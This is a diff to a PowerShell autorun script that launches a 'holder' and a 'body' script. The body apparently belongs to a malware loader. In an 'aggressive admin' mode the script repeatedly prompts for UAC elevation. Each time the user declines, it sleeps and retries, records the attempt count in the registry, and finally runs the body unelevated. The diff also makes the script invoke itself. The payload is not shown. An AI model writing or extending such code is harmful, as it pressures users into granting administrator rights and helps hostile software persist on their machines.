@@ -1,8 +1,29 @@
 . ./utils.ps1
 . ./consts_body.ps1
 
+$globalScriptPaths = @(
+    #$MyInvocation.MyCommand.Definition,
+    $PSCommandPath,
+    $MyInvocation.MyCommand.Path
+)
+
+function Get-ScriptPath {
+    
+    foreach ($path in $globalScriptPaths) {
+        try {
+            if (Test-Path $path) {
+                return $path
+            }
+        }
+        catch {
+        }
+    }
+}
+
 function do_autorun()
 {
+    $holder = (Get-HolderPath)
+    $body = (Get-BodyPath)
     if ($server.aggressiveAdmin)
     {
         $limit = $server.aggressiveAdminTimes
@@ -11,7 +32,7 @@ function do_autorun()
         if ($elevated)
         {
             writedbg "running elevated body path in aggressive admin"
-            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
+            RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $true
 
             $times = $times + 1
             RegWriteParamInt -keyName "aggressiveAdminTimes" -value $times
@@ -25,7 +46,7 @@ function do_autorun()
                 if ($times -gt $limit)
                 {
                     writedbg "no more times $times, running non elevated"
-                    RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false
+                    RunMe -script $body  -repassArgs $false -argName "" -argValue "" -uac $false
                     return
                 }
             }
@@ -38,32 +59,35 @@ function do_autorun()
                 writedbg "Not elevated, sleeping: $sleep"
                 Start-Sleep -Seconds $sleep
             }
-            if ($attempt -gt $server.aggressiveAdminAttempts)
+            if ($server.aggressiveAdminAttempts -gt 0 -and $attempt -gt $server.aggressiveAdminAttempts)
             {
                 writedbg "Not elevated run non-elevating body"
-                RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false    
+                RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false    
             }
             else 
             {
                 writedbg "trying to elevate holder"
                 try {
-                    RunMe -script (Get-ScriptPath) -repassArgs $false -argName "attempt" -argValue $attempt -uac $true  
+                    RunMe -script $holder -repassArgs $false -argName "attempt" -argValue $attempt -uac $true  
                 }
                 catch {
-                    RunMe -script (Get-ScriptPath) -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
+                    RunMe -script $holder -repassArgs $true -argName "attempt" -argValue $attempt -uac $false  
                 }        
             }
         }
     }
     else 
     {
+        writedbg "No aggresive admin"
         try 
         {
-            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
+            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $true
         }
         catch {
-            RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false
+            RunMe -script $body -repassArgs $false -argName "" -argValue "" -uac $false
         }
     }
 
 }
+
+do_autorun
